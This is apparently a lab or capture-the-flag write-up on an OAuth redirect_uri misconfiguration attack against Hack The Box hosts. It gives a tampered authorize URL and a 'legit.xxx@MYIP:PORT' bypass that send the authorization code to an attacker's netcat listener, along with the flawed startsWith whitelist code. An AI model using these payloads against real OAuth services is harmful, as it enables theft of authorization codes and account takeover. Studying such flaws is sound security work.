**Redirect_URI Missconfiguration Attack**
This attack happens when the **redirect_uri** is miss-configured and lacking serious black/whitelist filtering allows you to trick the back-end that used OAuth token to redirect the request to your machine and act like a MITM.

# Case scenario
You have 2 sites one is a file-share where you register your user and upload a file whatever.
Then you have another site where you can delete files from the first website; the second website used OAuth token to manage a SSO authentication and let you delete the files from the first website.

### How to attack
1)Proceed to login and obtain a OAuth token on the second site, before clicking to "Allow" change the url in the browser to point to your machine
From(legit):
```
http://securedocs.htb.net/oauth/authorize?response_type=code&client_id=deletedocs&redirect_uri=http%3A%2F%2Fdeletedocs.htb.net%2Fcallback&scope=view_documents%20delete_document 
```
To(malicious):
```
http://securedocs.htb.net/oauth/authorize?response_type=code&client_id=deletedocs&redirect_uri=http%3A%2F%2F<SERVER_IP>:<PORT>%2Fcallback&scope=view_documents%20delete_document
```
Click "Allow" and you should be able to get the communication back on your NC

## Post Analysis
This worked because the back-end was checking only if the **rediect_uri** was starting with **deletedocs.htb**, and by using 
```
redirect_uri=http://legit.xxx@MYIP:PORT&xxxxxx
```
We successfully bypassed the miss configuration. This is the Bad code!
```
whitelistedRedirectUrl.forEach(url => {
      if (redirectURI.startsWith(url)){
        shouldRedirect = true
      }
```